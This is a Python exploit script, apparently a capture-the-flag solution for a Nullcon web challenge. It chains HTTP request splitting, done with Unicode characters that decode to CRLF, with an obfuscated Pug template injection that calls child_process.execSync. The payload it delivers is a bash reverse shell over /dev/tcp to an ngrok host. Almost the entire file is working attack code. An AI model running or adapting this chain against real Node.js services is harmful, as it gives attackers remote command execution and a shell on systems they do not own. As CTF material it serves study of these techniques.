#!/usr/bin/env python3

"""
Download node 8.12.0 with nvm:
https://github.com/nvm-sh/nvm
"""

import requests

URL = 'http://web2.ctf.nullcon.net:8081'
# URL = 'http://localhost:8081'

NG_HOST = '0.tcp.ngrok.io'
NG_PORT = '13764'


def url_encode(s):
    return ''.join('%{0:0>2}'.format(format(ord(c), 'x')) for c in s)


bash_payload = (
    f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{NG_HOST}/{NG_PORT} 0>&1'"
)
pug_payload = '+'.join(
    f'Z({ord(c)})' for c in
    f'global.process.mainModule.require("child_process")'
    '.execSync("{bash_payload}")'
)

pug_injection = url_encode("""
-FIND_F=([][((1==0)+``)[0]+(``[``]+``)[5]+(``[``]+``)[1]+(``[``]+``)[2]])+``
-UND=``[``]+``
-C=FIND_F[3]
-T=((0==0)+``)[0]
-O=((({}))+(({})))[1]
-N=UND[1]
-U=UND[0]
-E=((1==0)+``)[4]
-R=((0==0)+``)[1]
-A=((1==0)+``)[1]
-S=((1==0)+``)[3]
-CON=C+O+N+S+T+R+U+C+T+O+R
-STR_CLS=``[CON]
-NUM_CLS=(1)[CON]
-M=(NUM_CLS+``)[11]
-TS=T+O+STR_CLS[N+A+M+E]
-W=(+(32))[TS](33)
-TLC=T+O+`L`+O+W+E+R+`C`+A+S+E
-F=((1==0)+``)[0]
-D=UND[2]
-H=(+(101))[TS](21)[1]
-FCC=F+R+O+M+`C`+H+A+R+`C`+O+D+E
-Z=STR_CLS[FCC]
-X=""" + pug_payload + """
-FIND_F[CON][CON](X)()
""")

payload = ''
payload += f'{URL}/core'
payload += '?q=x'
payload += '\u0120HTTP/1.1'
payload += '\u010D\u010A'
payload += 'Host:\u0120127.0.0.1:8081'
payload += '\u010D\u010A'
payload += '\u010D\u010A'
payload += 'GET\u0120/flag'
payload += '\u010D\u010A'
payload += 'pug:\u0120' + pug_injection
payload += '\u010D\u010A'
payload += 'adminauth:\u0120secretpassword'
payload += '\u010D\u010A'
payload += 'aa:\u0120bb'

print(payload)

r = requests.get(payload)
print(r.text)
